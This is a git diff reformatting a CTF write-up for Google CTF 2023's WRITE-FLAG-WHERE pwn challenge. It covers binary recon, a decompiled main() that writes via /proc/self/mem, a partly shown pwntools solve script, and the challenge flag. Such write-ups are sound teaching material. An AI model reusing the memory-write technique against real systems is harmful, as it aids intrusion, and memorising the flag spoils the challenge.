@@ -1,40 +1,55 @@
 ---
-CTF: Google 2023
-Challenge Name: WRITE-FLAG-WHERE
-Category: Pwn
-Date: 23/06/23
-Author: TODO
-Points: 50
-Solves: 294
+name: WRITE-FLAG-WHERE (2023)
+event: Google CTF 2023
+category: Pwn
+description: Writeup for WRITE-FLAG-WHERE (Pwn) - Google CTF (2023) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
 ---
 
-### Description
->In order to solve it will take skills of your own
->An excellent primitive you get for free
->Choose an address and I will write what I see
->But the author is cursed or perhaps it's just out of spite
->For the flag that you seek is the thing you will write
->ASLR isn't the challenge so I'll tell you what
->I'll give you my mappings so that you'll have a shot.
+# WRITE-FLAG-WHERE
+
+## Description
+
+> In order to solve it will take skills of your own
+> An excellent primitive you get for free
+> Choose an address and I will write what I see
+> But the author is cursed or perhaps it's just out of spite
+> For the flag that you seek is the thing you will write
+> ASLR isn't the challenge so I'll tell you what
+> I'll give you my mappings so that you'll have a shot.
 
 ## Recon
+
 First use `pwninit` to patch the binary with local libc (the supplied `libc.so.6` wasn't enough, I had to copy `ld-linux-x86-64.so.2` from a local backup of `GLIBC_2.34`, which is pretty standard for CTFs these days).
+
 ```bash
-ldd chal 
+ldd chal
 	linux-vdso.so.1 (0x00007fff98fb4000)
 	libc.so.6 => ./libc.so.6 (0x00007f1de5200000)
 	/lib64/ld-linux-x86-64.so.2 (0x00007f1de557b000)
 ```
 
 `file` shows the binary isn't stripped, which will make [[#Static Analysis]] easier.
+
 ```bash
-file chal 
+file chal
 chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325b22ba12d76ae327d8eb123e929cece1743e1e, not stripped
 ```
 
 Check binary protections with `checksec`.
+
 ```bash
-checksec --file chal 
+checksec --file chal
 [*] '/home/crystal/Desktop/chall/chal'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -51,8 +66,9 @@ Running the binary prints `flag.txt not found`.
 After creating flag.txt, the binary exits immediately, with no output.
 
 We could use `ltrace` to get a better understanding of what's happening.
+
 ```bash
-ltrace /home/crystal/Desktop/chall/chal 
+ltrace /home/crystal/Desktop/chall/chal
 open("/proc/self/maps", 0, 02371265710)                                 = 3
 read(3, "560bf9f7a000-560bf9f7b000 r--p 0"..., 4096)                    = 2189
 close(3)                                                                = 0
@@ -78,21 +94,24 @@ exit(0 <no return ...>
 ```
 
 OK, so the program..
-- reads 4096 bytes from `/proc/self/maps` into file descriptor (`fd`) 3
-- reads the flag into `fd` 3
-- tries to duplicate `fd` 1 to 1337
-- opens `/dev/null` as `fd` 3
-- tries to duplicate `fd` 3 to 0 (`stdin`)
-- tries to duplicate `fd` 3 to (`stdout`)
-- tries to duplicate `fd` 3 to 2 (`stderr`)
-- 3 x `dprintf` calls (print format string), but use an invalid `fd` of -1
+
+-   reads 4096 bytes from `/proc/self/maps` into file descriptor (`fd`) 3
+-   reads the flag into `fd` 3
+-   tries to duplicate `fd` 1 to 1337
+-   opens `/dev/null` as `fd` 3
+-   tries to duplicate `fd` 3 to 0 (`stdin`)
+-   tries to duplicate `fd` 3 to (`stdout`)
+-   tries to duplicate `fd` 3 to 2 (`stderr`)
+-   3 x `dprintf` calls (print format string), but use an invalid `fd` of -1
 
 `dprintf` is similar to `printf`, but it allows you to specify a `file descriptor` as the output stream. It writes the formatted output to the specified file descriptor instead of the standard output.
 
 I guess it's time to take a look at the code! Let's open it in `ghidra` 🐉
 
 ## Static Analysis
+
 I pasted the `main()` function into chatGPT and asked it to rename variables and make it more readable, here's what it gave me.
+
 ```c
 int main(void)
 {
@@ -108,12 +127,12 @@ int main(void)
     off64_t address;
     uint length;
     int scanf_result;
-    
+
     // Open and read the contents of /proc/self/maps
     maps_fd = open("/proc/self/maps", 0);
     num_bytes = read(maps_fd, maps, 4096);
     close(maps_fd);
-    
+
     // Open and read the contents of flag.txt
     flag_fd = open("./flag.txt", 0);
     if (flag_fd == -1) {
@@ -122,22 +141,22 @@ int main(void)
         num_bytes = read(flag_fd, flag, 128);
         if (num_bytes > 0) {
             close(flag_fd);
-            
+
             // Duplicate file descriptor 1 (stdout) to 0x539
             dup_result = dup2(1, 1337);
-            
+
             // Open /dev/null for writing
             null_fd = open("/dev/null", 2);
-            
+
             // Redirect stdin (0), stdout (1), and stderr (2) to /dev/null
             dup2(null_fd, 0);
             dup2(null_fd, 1);
             dup2(null_fd, 2);
             close(null_fd);
-            
+
             // Set an alarm for 60 seconds
             alarm(60);
-            
+
             // Write some introductory text and the contents of /proc/self/maps to the output
             dprintf(dup_result, "This challenge is not a classical pwn\n"
                     "In order to solve it will take skills of your own\n"
@@ -148,7 +167,7 @@ int main(void)
                     "ASLR isn't the challenge so I'll tell you what\n"
                     "I'll give you my mappings so that you'll have a shot.\n");
             dprintf(dup_result, "%s\n\n", maps);
-            
+
             while (1) {
                 // Prompt the user for an address and length
                 dprintf(dup_result, "Give me an address and a length just so:\n"
@@ -156,15 +175,15 @@ int main(void)
                         "And I'll write it wherever you want it to go.\n"
                         "If an exit is all that you desire\n"
                         "Send me nothing and I will happily expire\n");
-                
+
                 // Read the user's input
                 scanf_result = scanf("%llx %u", &address, &length);
-                
+
                 // Check if the input was successfully parsed
                 if (scanf_result != 2 || length > 128) {
                     break;
                 }
-                
+
                 // Open /proc/self/mem for writing
                 mem_fd = open("/proc/self/mem", 2);
                 // Set the file position to the specified address
@@ -183,18 +202,18 @@ int main(void)
 }
 ```
 
-We quickly realise the program *should* print some output. When connecting to the remote server, it does so as intended. A teammate later informed me of a fix for this `ulimit -n 1338` will increase the maximum number of open file descriptors for the current shell session to 1338 (remember, the program sets the output to `fd` 1337).
+We quickly realise the program _should_ print some output. When connecting to the remote server, it does so as intended. A teammate later informed me of a fix for this `ulimit -n 1338` will increase the maximum number of open file descriptors for the current shell session to 1338 (remember, the program sets the output to `fd` 1337).
 
 Anyway, the while loop at the bottom is interesting. It takes a user-supplied `address` and `length`, then reads the flag to that address.
 
 What address might we choose to write the flag to? How about the string that is printed at the beginning of each loop?
 
 ```c
-                s_Give_me_an_address_and_a_lengt  XREF[2]: main:00101357(*), 
-                                                           main:0010135e(*)  
+                s_Give_me_an_address_and_a_lengt  XREF[2]: main:00101357(*),
+                                                           main:0010135e(*)
 001021e0 47 69      ds      "Give me an address and a length
-        76 65 
-        20 6d 
+        76 65
+        20 6d
 ```
 
 It's in the `.data` section of the binary, at an offset of `0x21e0`.
@@ -202,6 +221,7 @@ It's in the `.data` section of the binary, at an offset of `0x21e0`.
 The program has PIE enabled, so each time it's run, the binary will have a new base address.
 
 We need to find the base, then add the offset. Luckily, running the program against the remote server will print out the memory mappings, e.g.
+
 ```bash
 I'll give you my mappings so that you'll have a shot.
 55bae719b000-55bae719c000 r--p 00000000 00:11e 810424                    /home/user/chal
@@ -209,15 +229,15 @@ I'll give you my mappings so that you'll have a shot.
 55bae719d000-55bae719e000 r--p 00002000 00:11e 810424                    /home/user/chal
 55bae719e000-55bae719f000 r--p 00002000 00:11e 810424                    /home/user/chal
 55bae719f000-55bae71a0000 rw-p 00003000 00:11e 810424                    /home/user/chal
-55bae71a0000-55bae71a1000 rw-p 00000000 00:00 0 
-7fdfc7618000-7fdfc761b000 rw-p 00000000 00:00 0 
+55bae71a0000-55bae71a1000 rw-p 00000000 00:00 0
+7fdfc7618000-7fdfc761b000 rw-p 00000000 00:00 0
 7fdfc761b000-7fdfc7643000 r--p 00000000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
 7fdfc7643000-7fdfc77d8000 r-xp 00028000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
 7fdfc77d8000-7fdfc7830000 r--p 001bd000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
 7fdfc7830000-7fdfc7834000 r--p 00214000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
 7fdfc7834000-7fdfc7836000 rw-p 00218000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6
-7fdfc7836000-7fdfc7843000 rw-p 00000000 00:00 0 
-7fdfc7845000-7fdfc7847000 rw-p 00000000 00:00 0 
+7fdfc7836000-7fdfc7843000 rw-p 00000000 00:00 0
+7fdfc7845000-7fdfc7847000 rw-p 00000000 00:00 0
 7fdfc7847000-7fdfc7849000 r--p 00000000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
 7fdfc7849000-7fdfc7873000 r-xp 00002000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
 7fdfc7873000-7fdfc787e000 r--p 0002c000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
@@ -232,6 +252,7 @@ ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsysca
 Therefore, we'll write a script to parse this response and calculate the correct address. We'll send that address when requested and the next time the loop executes, it will print the newly written data (🚩).
 
 ## Solve Script
+
 ```python
 from pwn import *
 
@@ -260,6 +281,5 @@ warning(io.recv().decode())
 ```
 
 We run the script and get the flag.
-```json
-CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}
-```
+
+Flag:`CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}`
